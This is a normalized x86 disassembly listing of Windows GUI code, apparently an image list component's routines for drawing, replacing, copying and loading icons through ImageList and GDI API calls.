call [ ecx + 0x44 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_451144
call sub_44df24
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_488dd8
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_451144
call sub_44df24
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_488dd8
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x70 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x70 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_488dd8
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489573
mov eax [ ebp - 0x10 ]
call sub_4055f0
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
sub_489608
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4896a1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x40 ] 0x0
je r-xdata
mov eax ebx
mov si 0xfff0
call sub_40587c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4896a8
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
test esi esi
jne r-xdata
mov edx esi
mov eax ebx
call sub_48a0f8
mov eax esi
call sub_452f10
push eax
push edi
mov eax ebx
call sub_488dd8
push eax
call ImageList_ReplaceIcon
inc eax
jne r-xdata
push 0x0
xor ecx ecx
mov edx edi
mov eax ebx
call sub_4892c0
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
sub_4896b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48972a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4892a4
cmp esi eax
jl r-xdata
cmp [ ebx + 0x40 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
mov eax ebx
mov si 0xfff0
call sub_40587c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489731
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
push esi
mov eax ebx
call sub_488dd8
push eax
call ImageList_Remove
sub_489744
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x40 ]
test edi edi
je r-xdata
mov [ ebx + 0x48 ] esi
mov eax esi
call sub_488a00
push eax
push edi
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xfff0
call sub_40587c
pop edi
pop esi
pop ebx
retn
sub_489774
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x70 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_488e3c
mov [ esi + 0x70 ] bl
mov eax esi
call sub_488e6c
sub_489794
push esi
mov esi eax
cmp ecx [ esi + 0x34 ]
jne r-xdata
mov [ esi + 0x34 ] ecx
mov ecx edx
mov [ esi + 0x38 ] ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
cmp edx [ esi + 0x38 ]
je r-xdata
mov eax esi
call sub_489738
mov eax esi
call sub_488c1c
mov eax esi
mov si 0xfff0
call sub_40587c
mov edx [ esi + 0x34 ]
push edx
push ecx
push eax
call ImageList_SetIconSize
pop esi
retn
sub_4897d8
push ebx
mov ebx eax
cmp [ ebx + 0x40 ] 0x0
je r-xdata
mov eax [ ebx + 0x48 ]
pop ebx
retn
mov eax ebx
call sub_488dd8
push eax
call ImageList_GetBkColor
call sub_488a20
pop ebx
retn
sub_4897fc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x40 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x4c ]
call sub_488a00
push eax
mov eax ebx
call sub_4897d8
call sub_488a00
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44df24
push eax
push esi
mov eax ebx
call sub_488dd8
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x58 ]
call sub_451144
mov eax [ eax + 0x48 ]
mov edx 0xffffff
call sub_44cd1c
mov eax [ ebx + 0x34 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebx + 0x38 ]
xor edx edx
xor eax eax
call sub_42e1b0
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebx + 0x58 ]
call sub_451144
pop edx
mov ecx [ eax ]
call [ ecx + 0x4c ]
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x58 ]
call sub_451144
call sub_44df24
push eax
push esi
mov eax ebx
call sub_488dd8
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x34 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x38 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_42e1b0
mov eax [ ebx + 0x58 ]
call sub_451144
call sub_44df24
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx 0xff000014
call sub_44cd1c
mov eax [ ebp - 0x4 ]
call sub_44df24
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
push edi
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx 0xff000010
call sub_44cd1c
mov eax [ ebp - 0x4 ]
call sub_44df24
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
push edi
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov edi eax
mov [ ebx + 0x58 ] edi
mov dl 0x1
mov eax edi
call sub_4522e8
mov edx [ ebx + 0x38 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x34 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_4899c8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
movzx ebx [ eax + 0x44 ]
push ebx
movzx ebx [ eax + 0x47 ]
push ebx
movzx ebx [ ebp + 0x8 ]
push ebx
call sub_4899f0
pop ebx
pop ebp
retn 0xc
sub_4899f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
cmp [ esi + 0x40 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push ecx
mov eax [ ebp + 0x18 ]
push eax
movzx eax [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov edx [ ebp + 0x14 ]
mov eax esi
mov ecx edi
mov ebx [ eax ]
call [ ebx + 0x34 ]
sub_489a34
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
movzx ebx [ ebp + 0xc ]
push ebx
push 0x2
push 0x0
movzx ebx [ ebp + 0x8 ]
push ebx
call sub_489a58
pop ebx
pop ebp
retn 0x10
sub_489a58
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi eax
cmp [ esi + 0x40 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x18
movzx edi [ ebp + 0x14 ]
inc edi
shl edi 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
movzx eax [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
movzx ecx [ ebp + 0xc ]
or eax [ ecx * 4 + rw-data ]
and edi 0xf00
or eax edi
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx edx
mov eax esi
mov edx [ ebp + 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
sub_489ab4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x40 ] 0x0
je r-xdata
xor eax eax
movzx eax bl
inc eax
push eax
push esi
mov eax edi
call sub_488dd8
push eax
call ImageList_SetOverlayImage
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_489ae4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
xor edx edx
xor eax eax
call sub_42e1b0
mov eax [ ebp - 0x4 ]
call sub_48acd8
xor eax eax
push ebp
push sub_489c7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_489c60
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_489c43
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4522e8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489c4a
mov eax [ ebp - 0x10 ]
call sub_4055f0
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_451144
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_44df24
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_451144
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_44df24
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_488f90
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_489c8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_489d7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_48acd8
xor eax eax
push ebp
push sub_489d61
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4892a4
cmp ebx eax
jle r-xdata
cmp esi 0xffffffff
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
mov ecx [ ebp + 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_488f90
mov ecx esi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_48905c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489d68
mov eax [ ebp - 0x4 ]
call sub_48acdc
retn
dec esi
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4892a4
sub eax 0x2
mov esi ebx
sub esi eax
jg r-xdata
push 0x1
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_488dd8
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_488dd8
push eax
call ImageList_Copy
dec ebx
inc esi
jne r-xdata
sub_489db8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_489f03
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_48acd8
xor eax eax
push ebp
push sub_489ee6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x5
mov ecx 0x5
mov dl 0x1
mov eax [ r-xdata ]
call sub_488a8c
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_489738
mov eax [ ebp - 0xc ]
call sub_4892a4
cmp edi eax
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_452dd4
mov [ ebp - 0x10 ] eax
mov ebx edi
dec ebx
test ebx ebx
jl r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_489178
mov esi edi
mov eax [ ebp - 0xc ]
call sub_4892a4
mov ebx eax
dec ebx
sub ebx esi
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489eed
mov eax [ ebp - 0x4 ]
call sub_48acdc
mov eax [ ebp - 0x10 ]
call sub_4055f0
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
inc ebx
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_489244
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_489178
inc esi
dec ebx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_489244
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_489178
inc esi
dec ebx
jne r-xdata
sub_489f14
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_488f90
push 0x1
mov eax ebx
call sub_4892a4
dec eax
push eax
mov eax ebx
call sub_488dd8
push eax
push esi
mov eax ebx
call sub_488dd8
push eax
call ImageList_Copy
mov edx esi
mov eax ebx
call sub_4896b0
mov eax ebx
call sub_4892a4
mov esi eax
sub esi 0x2
sub edi esi
jg r-xdata
dec edi
push 0x1
lea eax [ esi + 0x1 ]
push eax
mov eax ebx
call sub_488dd8
push eax
push esi
mov eax ebx
call sub_488dd8
push eax
call ImageList_Copy
dec esi
inc edi
jne r-xdata
sub_489f8c
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
or edi 0xffffffff
mov eax ebx
call sub_4892a4
mov edi eax
mov eax esi
call sub_488dd8
mov edx eax
mov ecx ebp
mov eax ebx
call sub_489ae4
jmp r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_489fc4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_488dd8
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_489ae4
sub_489fe4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax ebx
call sub_488e3c
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4312cc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48a05f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_433c88
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48a074
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43139c
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48a0e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_433c88
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_48a0f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48a164
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a16b
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
cmp eax [ ebx + 0x34 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
cmp eax [ ebx + 0x38 ]
jge r-xdata
sub_48a198
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
movzx ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_48a1ec
pop ebx
pop ebp
retn 0x10
sub_48a1b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax [ ebp + 0x14 ]
call sub_407134
push eax
mov eax [ ebp + 0x10 ]
push eax
movzx eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_48a1ec
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_48a1ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp + 0xc ]
xor esi esi
test al 0x1
je r-xdata
test al 0x2
je r-xdata
or esi 0x0
test al 0x4
je r-xdata
or esi 0x40
test al 0x8
je r-xdata
or esi 0x10
test al 0x10
je r-xdata
or esi 0x1000
test al 0x20
je r-xdata
or esi 0x20
push esi
movzx eax [ ebp - 0x5 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x3c ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ImageList_LoadImageW
mov ebx eax
test ebx ebx
je r-xdata
or esi 0x1
xor eax eax
or ecx 0xffffffff
mov edx ebx
mov eax edi
call sub_489ae4
push ebx
call ImageList_Destroy
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_48a27c
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
xchg edx ecx
call sub_48a1b8
pop ebp
retn 0xc
sub_48a2a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ eax + 0x38 ]
push ebx
movzx ebx [ r-xdata ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_48a1b8
pop ebx
pop ebp
retn 0x8
sub_48a2c5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ rw-data ]
jne r-xdata
mov esi [ rw-data ]
mov esi [ esi ]
test esi esi
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
movzx eax [ r-xdata ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx [ rw-data ]
mov edx [ edx ]
movzx ecx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_48a1b8
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi esi
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
movzx eax [ r-xdata ]
push eax
mov eax [ ebp + 0x8 ]
push eax
movzx ecx [ ebp - 0x5 ]
mov edx [ edi + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_48a1b8
mov ebx eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax [ edi + 0x10 ]
je r-xdata
mov esi [ esi ]
test esi esi
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
movzx eax [ r-xdata ]
push eax
mov eax [ ebp + 0x8 ]
push eax
movzx ecx [ ebp - 0x5 ]
mov edx [ edi + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_48a1b8
mov ebx eax
sub_48a399
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov ebx [ eax + 0x38 ]
push ebx
movzx ebx [ r-xdata ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_48a27c
pop ebx
pop ebp
retn 0x4
sub_48a3c1
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
mov ebx eax
mov [ ebx + 0x5c ] 0x1
cmp [ ebx + 0x60 ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
test eax eax
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x50 ]
call sub_4305a0
mov si 0xffff
call sub_40587c
inc ebp
dec edi
jne r-xdata
sub_48a414
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x50 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_430438
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4305a0
cmp ebp eax
jne r-xdata
sub_48a46c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_410f30
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_48a4b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_4892a4
mov ebx eax
mov eax edi
call sub_4892a4
cmp ebx eax
je r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_4892a4
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_48a58c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_48a56f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_48a46c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a576
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
mov eax edi
call sub_4892a4
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_48a5a0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4892a4
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_48a4b0
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_48a5fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43c58c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push ebp
call sub_48a5a0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
